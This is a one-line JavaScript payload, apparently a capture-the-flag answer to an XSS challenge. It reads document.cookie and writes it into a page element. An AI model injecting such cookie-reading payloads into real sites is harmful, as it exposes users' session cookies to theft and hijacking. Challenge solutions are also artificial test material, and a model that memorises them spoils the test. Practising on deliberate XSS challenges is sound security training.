This payload solves the XSS challenge.

```js
document.getElementById('output').innerHTML = document.cookie; 
```
